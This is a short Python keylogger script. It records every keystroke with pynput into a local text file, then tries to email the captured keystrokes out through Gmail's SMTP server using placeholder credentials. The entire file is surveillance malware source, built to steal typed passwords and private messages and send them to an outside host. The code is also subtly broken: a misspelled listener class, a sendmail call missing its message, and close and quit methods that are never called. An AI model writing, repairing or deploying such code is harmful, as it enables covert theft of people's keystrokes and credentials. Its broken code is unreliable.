import ssl
import smtplib
from pynput import keyboard

sender = "userid@domain.com"
receiver = "userid@domain.com"
password = "passcode"
message = """From: userid@domain.com
                To: userid@domain.com
                Subject: KeyLogs
                Text: Keylogs
            """

def writefile(text):
    with open("keylogger.txt",'a') as f:
        f.write(text)
        f.close

def key_press(Key):

    try:
        writefile('alphanumeric key {0} pressed'.format(Key.char))
    except AttributeError:
        writefile('special key {0} pressed'.format(Key))

def key_release(Key):
    if(Key == keyboard.Key.esc):
        return False

with keyboard.Listner(
    on_press = key_press, 
    on_release = key_release) as listener:
    listener.join()

with open("keylogger.txt",'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()

text = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', 587) # port 587 is used for mail submission
server.starttls()
server.login(sender,password)
server.sendmail(sender,receiver)
print("Email Sucessfully Sent to", sender)
server.quit


